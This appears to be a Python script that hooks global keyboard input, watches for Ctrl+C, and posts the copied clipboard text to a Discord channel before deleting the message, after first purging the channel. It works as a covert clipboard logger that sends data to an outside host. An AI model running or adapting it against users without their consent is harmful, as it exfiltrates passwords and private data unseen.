import configparser
import discord
import pyperclip
from pynput import keyboard
from threading import Thread

config = configparser.ConfigParser()
config.read('details.ini')

client_token = config['discord']['client_token']
server_channel = config['discord']['server_channel']

global copied
copied = False

bot = discord.Client(intents = discord.Intents.all())


def fun(key):
    global copied
    if(str(key) == "'\\x03'"):
        copied = True # Copied

def keyboard_listener_thread():
    kb = keyboard.Controller()

    with keyboard.Listener(on_press = fun) as listener:
        listener.join()


@bot.event
async def on_ready():
    print("Ready")

    Thread(target = keyboard_listener_thread).start()

    global copied

    channel = bot.get_channel(server_channel)

    try:
        await channel.purge(limit = 100)
    except:
        pass

    while True:
        if copied:
            try:
               await channel.send(pyperclip.paste()) # Sent to discord
               await channel.purge(limit = 1) # Deleted from discord
            except:
                await channel.send("Error : Content copied is too long") # Error - Content copied is too long
            copied = False
        else:
            pass

bot.run(client_token)
